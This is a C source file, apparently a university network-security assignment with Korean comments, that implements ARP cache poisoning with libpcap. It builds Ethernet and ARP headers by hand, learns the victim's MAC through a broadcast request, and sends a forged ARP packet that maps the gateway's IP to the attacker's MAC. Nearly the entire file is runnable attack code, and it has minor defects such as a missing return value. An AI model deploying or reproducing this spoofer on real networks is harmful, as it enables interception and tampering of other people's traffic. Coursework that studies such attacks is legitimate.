/*
 * Author : Jinkyoung Kim
 *
 * This program changes victim's arp table
 * 
 * contact : kjkjk1178@gmail.com
 */


#include <pcap.h>
#include <stdio.h>
#include <netinet/ether.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <unistd.h>
#include <stdlib.h> 

#define ETHERSIZE 14
#define IPADDRLEN 4


/*
패킷 보냄 - arp 
victim과 gateway의 ip, mac을 알아내고 속이기..

[리포트]
sender(victim)의 arp table을 변조하라.


[학습]

arp infection packet 구성에 필요한 sender mac 정보는 프로그램 레벨에서 자동으로(정상적인 arp request를 날리고 그 arp reply를 받아서) 알아 오도록 코딩한다.

최종적으로 상대방을 감염시킬 수 있도록 eth header와 arp header를 구성하여 arp infection packet을 보내고 sender에서 target arp table이 변조되는 것을 확인해 본다.

[제출 기한]
2018.08.06 23:59

*/

pcap_t * handle;
uint8_t myMAC[ETH_ALEN];
uint8_t victimMAC[ETH_ALEN];

uint32_t victimIP ;
uint32_t targetIP ;

#pragma pack(1) //패딩 삭제
typedef struct myArphdr
{
    uint16_t hardType;		
    uint16_t protoType;	
    uint8_t hardLen;		
    uint8_t protoLen;		
    uint16_t opcode;		

    uint8_t srcMAC[ETH_ALEN];	
    uint32_t srcIP;		
    uint8_t dstMAC[ETH_ALEN];	
    uint32_t dstIP;

}ARPHDR;


void MakeEtherHeader(struct ether_header * eth, uint8_t * dstMAC, uint8_t * srcMAC)
{
    memcpy((char *)eth->ether_dhost, (char*) dstMAC, ETH_ALEN);
    memcpy((char *)eth->ether_shost, (char*) srcMAC, ETH_ALEN);    
    eth->ether_type = htons(ETHERTYPE_ARP);

}

void MakeARP(uint16_t arpType, ARPHDR* arp, uint8_t * dstMAC, uint8_t * srcMAC,  uint32_t dstIP, uint32_t srcIP)
{
    //header
    arp->hardType  = htons(ARPHRD_ETHER);
    arp->protoType = htons(ETHERTYPE_IP);
    arp->hardLen = ETH_ALEN;
    arp->protoLen = IPADDRLEN;
    arp->opcode = htons(arpType); 

    //내용
    memcpy((char *)arp->srcMAC, (char * )srcMAC, ETH_ALEN);
    arp->srcIP = srcIP;
    memcpy((char *)arp->dstMAC, (char * )dstMAC, ETH_ALEN);
    arp->dstIP = dstIP;

}



//
bool SendARP(uint8_t arpType, uint8_t *buf, uint8_t * dstMAC, uint8_t * srcMAC, uint32_t dstIP, uint32_t srcIP)
{
    struct ether_header *eth = (struct ether_header * )buf;
    ARPHDR * arp = (ARPHDR *)((uint8_t *)buf + ETHERSIZE);

    switch(arpType)
    {
    case ARPOP_REQUEST: //0으로 채워야 ...
        uint8_t requestMAC[ETH_ALEN];

        memset(requestMAC, 0xFF, sizeof(requestMAC));
        MakeEtherHeader(eth, requestMAC, srcMAC);

        memset(requestMAC, 0x00, sizeof(requestMAC));
    
        MakeARP(ARPOP_REQUEST, arp, requestMAC, srcMAC, dstIP, srcIP);
        
        break;

    case ARPOP_REPLY:

        MakeEtherHeader(eth, dstMAC, srcMAC); 
    
        MakeARP(ARPOP_REPLY, arp, dstMAC, srcMAC, dstIP, srcIP);
        break;
    }

    //패킷 전송
    pcap_sendpacket(handle, (const u_char *)buf, 0x2a);
}


void GetMyMAC(uint8_t * interface, uint8_t * myMAC)
{
    //내 MAC 얻기
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, (char *)interface);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) 
    {
        memcpy(myMAC, s.ifr_addr.sa_data, ETH_ALEN);
    }
    else
    {
        printf("Fail to get my MAC address!\n");
        exit(1);
    }
}





bool IsARPNext(uint16_t ethType)
{
  if (ntohs(ethType) == ETHERTYPE_ARP)
    return true;
  else  
    return false;

} 


bool IsARPVictim(uint32_t ip)
{
    if (victimIP == ip)
        return true;
    else
        return false;
}

bool IsARPResponse(uint8_t * packet)
{

    struct ether_header * eth = (struct ether_header *)packet;

    //----- check MAC -----

    //받는 패킷인지 체크
    if(memcmp(eth->ether_dhost, myMAC, ETH_ALEN))
    {
       return false; 
    }
    //_____ check MAC ______


    //----- check ARP -----

    if(! IsARPNext(eth->ether_type))
        return false;
 
    //_____ check ARP _____

    //ARP 패킷 떼기
    ARPHDR * arp = (ARPHDR *)((uint8_t *)eth + ETHERSIZE);

    //victim에게 온 것인지 체크
    if(!IsARPVictim(arp->srcIP))
    {
        return false;
    }

    memcpy(victimMAC, eth->ether_shost, ETH_ALEN);

    return true;

}




int main(int argc, char * argv[])
{

    if(argc !=4)
    {
        printf("usage : send_arp <interface> <sender ip> <target ip>\n");
        return 1;

    }

    uint8_t errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, (char *)errbuf);

    if (handle == NULL) 
    {
        fprintf(stderr, "couldn't open device %s: %s\n", argv[1], errbuf);
        return -1;
    }

    uint8_t buf[0x2a];
    memset(buf, 0, sizeof(buf));

     victimIP = inet_addr(argv[2]);
     targetIP = inet_addr(argv[3]);


 
    GetMyMAC((uint8_t *)argv[1], myMAC);

    //피해자의 MAC을 알아온다
    //broadcast
    SendARP(ARPOP_REQUEST, buf, NULL, myMAC, victimIP, targetIP);

    bool getResponse = false;
    //deadlock 조심
    //timeout 넣을까?
    //get response
    while (!getResponse) 
    {
        struct pcap_pkthdr * header;
        const uint8_t * packet;
        int i = 0;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        
        //ARP 응답인지 체크
        getResponse = IsARPResponse((uint8_t *)packet);
        
    }


    //ARP spoofing
    SendARP(ARPOP_REQUEST, buf, victimMAC, myMAC, victimIP, targetIP);


}

